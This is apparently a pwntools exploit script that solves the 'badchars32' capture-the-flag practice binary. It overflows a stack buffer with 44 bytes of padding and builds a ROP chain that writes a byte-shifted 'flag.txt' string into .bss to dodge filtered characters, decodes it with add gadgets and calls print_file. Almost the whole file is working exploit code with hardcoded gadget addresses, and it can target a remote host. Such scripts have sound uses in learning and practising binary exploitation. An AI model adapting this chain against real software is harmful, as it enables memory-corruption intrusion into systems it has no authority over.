from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *main
continue
'''.format(**locals())

exe = './badchars32'
elf = context.binary = ELF(exe, checksec=False)
p = start()

ret = 0x08048386
pos = elf.bss() + 0x100
mov_edi_esi = 0x0804854f
pop_esi_edi_ebp = 0x080485b9
pop_ebp = 0x080485bb
pop_ebx = 0x0804839d
add_ebp_bl = 0x08048543

def decflag(flag):
    return bytes([x - 1 for x in flag])

# ===== Exploit script here =====
info("Pos: " + hex(pos))

payload = b'A'*44
payload += p32(pop_esi_edi_ebp) + decflag(b'flag') + p32(pos) + p32(0) + p32(mov_edi_esi)
payload += p32(pop_esi_edi_ebp) + decflag(b'.txt') + p32(pos + 4) + p32(0) + p32(mov_edi_esi) 

for i in range(8):
    payload += p32(pop_ebp) + p32(pos + i) + p32(pop_ebx) + b'\x01'*4 + p32(add_ebp_bl)

payload += p32(elf.sym['print_file']) + p32(0) + p32(pos)

p.sendlineafter(b'> ', payload)
p.interactive()